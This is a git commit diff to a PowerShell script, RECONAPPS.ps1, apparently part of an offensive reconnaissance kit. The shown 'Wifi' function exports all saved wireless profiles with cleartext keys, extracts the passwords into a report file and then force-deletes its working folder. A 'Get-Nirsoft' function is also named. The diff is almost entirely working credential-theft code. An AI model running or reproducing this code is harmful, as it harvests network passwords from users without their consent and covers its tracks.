9efbed34fb38a014da5b3402bb9ddc5a8862ae53
HtheP <123617106+HtheP@users.noreply.github.com>
2023-02-28 00:24:40 -0700

    Update RECONAPPS.ps1

--- RECONAPPS.ps1
+++ RECONAPPS.ps1
@@ -10,9 +10,8 @@ function Get-Nirsoft {
 }
 
 function Wifi {
-Set-Location -Path $RECONAPPS; netsh wlan export profile key=clear
+Set-Location -Path $P1X3L; netsh wlan export profile key=clear
 Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\P1X3l\\", ''} | % {$_ -replace '.xml:22:', ''} > $P1X3L\WiFi_Passwords-RECON_Report.txt
-Set-Location -Path $P1X3L
 Remove-Item -Path "$P1X3L\RECON_APPS" -Force -Recurse;
 }
 
